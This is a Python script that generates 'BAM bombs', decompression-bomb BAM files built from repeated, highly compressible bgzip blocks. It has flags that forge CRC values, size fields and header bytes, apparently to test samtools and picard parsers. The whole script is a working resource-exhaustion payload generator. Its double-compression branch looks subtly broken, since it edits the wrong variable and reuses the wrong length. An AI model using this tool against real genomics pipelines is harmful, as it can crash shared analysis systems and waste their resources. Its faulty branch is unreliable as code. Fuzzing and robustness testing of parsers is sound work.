#!/usr/bin/env python

import sys
import zlib
import struct
import argparse

parser = argparse.ArgumentParser(description="Create BAM bombs")
parser.add_argument("-r",  "--reads",       help='How many reads per bgzip block. More than 1489 might need -t2',            default=1,     type=int)
parser.add_argument("-b",  "--blocks",      help='How many bgzip blocks to write to BAM file',                               default=1,     type=int)
parser.add_argument("-t1", "--test_one",    help='Test if compressed file size can be any value',                            default=False, action='store_true')
parser.add_argument("-t2", "--test_two",    help='Test if we can have more than 2 bytes to describe decompressed file size', default=False, action='store_true')
parser.add_argument("-t3", "--test_three",  help='Test if we can compress the compressed reads',                             default=False, action='store_true')
parser.add_argument("-t4", "--test_four",   help='Test if crc checked',                                                      default=False, action='store_true')
parser.add_argument("-t5", "--test_five",   help='Test if uncompressed file size can be any value',                          default=False, action='store_true')
parser.add_argument("-t6", "--test_six",    help='Test if nearly-all-null BAM entry works (gets better compression)',        default=False, action='store_true')
parser.add_argument("-rp",  "--read_permutations", help='Format is (position_in_entry=byte_in_hex), e.g. -rp 4=ff 8=0b ...', default=[],    nargs='*')
parser.add_argument("-gp",  "--gzip_permutations", help='Format is (position_in_entry=byte_in_hex), e.g. -gp 4=ff 8=0b ...', default=[],    nargs='*')
args = parser.parse_args()

# Make header
c = zlib.compressobj(9, zlib.DEFLATED, -15)
header = 'BAM\x01\x1a\x00\x00\x00@SQ\tSN:chr1\tLN:1431655765\n\x01\x00\x00\x00\x05\x00\x00\x00chr1\x00UUUU'
compressed_header = c.compress(header) + c.flush()
output = (
    '\x1f\x8b\x08\x04\x00\x00\x00\x00\x00\xff\x06\x00\x42\x43\x02\x00' + # bgzip magic 
    struct.pack("<H", len(compressed_header) + 25)                     + # size of the compressed block 
    compressed_header                                                  + # the compressed block
    struct.pack("<I", zlib.crc32(header) & 0xffffffff )                + # crc32 checksum
    struct.pack("<I", len(header))                                       # size the data should be when unzipped
)

# Make reads
# samtools compatible read (best compression):
read = '(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
# picard compatible read (valid BAM):
read = '(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x49\x12\x01\x00\x81\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00'
read = list(read)

for permutation in args.read_permutations:
	pos,val = permutation.split('=')
	read[int(pos)] = chr(int(val))

read = ''.join(read)
reads = read * args.reads
c = zlib.compressobj(9, zlib.DEFLATED, -15)
compressed_reads = c.compress(reads) + c.flush()
if args.test_one: compressed_reads_len = 1
else:             compressed_reads_len = len(compressed_reads) + 25
if args.test_two: final_reads = '\x1f\x8b\x08\x04\x00\x00\x00\x00\x00\xff\x08\x00\x42\x43\x04\x00' + struct.pack("<I",compressed_reads_len)
else:             final_reads = '\x1f\x8b\x08\x04\x00\x00\x00\x00\x00\xff\x06\x00\x42\x43\x02\x00' + struct.pack("<H",compressed_reads_len)

final_reads = list(final_reads)
for permutation in args.gzip_permutations:
	pos,val = permutation.split('=')
	final_reads[int(pos)] = chr(int(val))
final_reads = ''.join(final_reads)

final_reads += compressed_reads
final_reads += 'yolo' if args.test_four else struct.pack("<I", zlib.crc32(reads) & 0xffffffff )   # crc32 checksum
final_reads += 'swag' if args.test_five else struct.pack("<I", len(reads))                                                      # size the data should be when unzipped

for _ in range(args.blocks): output += final_reads

if args.test_three:
	c = zlib.compressobj(9, zlib.DEFLATED, -15)
	double_compressed_reads = c.compress(output) + c.flush()
	if args.test_one: double_compressed_reads_len = 1
	else:             double_compressed_reads_len = len(compressed_reads) + 25
	if args.test_two: final_final_reads = '\x1f\x8b\x08\x04\x00\x00\x00\x00\x00\xff\x08\x00\x42\x43\x04\x00' + struct.pack("<I",compressed_reads_len)
	else:             final_final_reads = '\x1f\x8b\x08\x04\x00\x00\x00\x00\x00\xff\x06\x00\x42\x43\x02\x00' + struct.pack("<H",compressed_reads_len)

	final_reads = list(final_reads)
	for permutation in args.gzip_permutations:
		pos,val = permutation.split('=')
		final_reads[int(pos)] = chr(int(val))
	final_reads = ''.join(final_reads)

	final_final_reads += double_compressed_reads
	final_final_reads += 'yolo' if args.test_four else struct.pack("<I", zlib.crc32(output) & 0xffffffff )   # crc32 checksum
	final_final_reads += 'swag' if args.test_five else struct.pack("<I", len(output))                                                      # size the data should be when unzipped
	sys.stdout.write(final_final_reads)
else:
    sys.stdout.write(output)
# Write out with EOF
sys.stdout.write('\x1f\x8b\x08\x04\x00\x00\x00\x00\x00\xff\x06\x00BC\x02\x00\x1b\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00')
